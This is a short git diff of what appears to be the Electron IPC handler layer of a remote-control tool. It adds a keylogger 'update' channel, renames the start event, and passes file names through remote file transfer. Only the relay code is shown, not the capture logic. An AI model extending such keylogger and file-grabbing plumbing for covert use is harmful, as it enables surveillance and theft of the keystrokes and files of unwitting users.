@@ -18,7 +18,7 @@ const channels = {
       // console.log("requestKeylogger")
       // event.sender.send('updateKeylogger', "2333")
       request.startKeyLogger().then((packet) => {
-        event.sender.send('updateKeylogger', packet)
+        event.sender.send('keyloggerStart', packet)
       }).catch(err => {
         // event.sender.send('updateKeylogger', err.toString())
         console.log('requestKeylogger' + err)
@@ -29,6 +29,13 @@ const channels = {
       }).catch(err => {
         // event.sender.send('updateKeylogger', err.toString())
         console.log('stopKeylogger' + err)
+      })
+    } else if (method === 'update') {
+      request.updateKeyLogger().then((packet) => {
+        event.sender.send('KeyloggerUpdate', packet)
+      }).catch(err => {
+        // event.sender.send('updateKeylogger', err.toString())
+        console.log('updateKeylogger' + err)
       })
     } else {
       console.log('wrong method')
@@ -49,9 +56,9 @@ const channels = {
       console.log(`get filepreview failed ${err}`)
     })
   },
-  requestFile: (event, path) => {
+  requestFile: (event, path, fileName) => {
     request.transFile(path).then((packet) => {
-      let url = saveFile(packet)
+      let url = saveFile(packet, fileName)
       event.sender.send('transfile', url)
     }).catch(err => {
       console.log(`get file failed ${err}`)
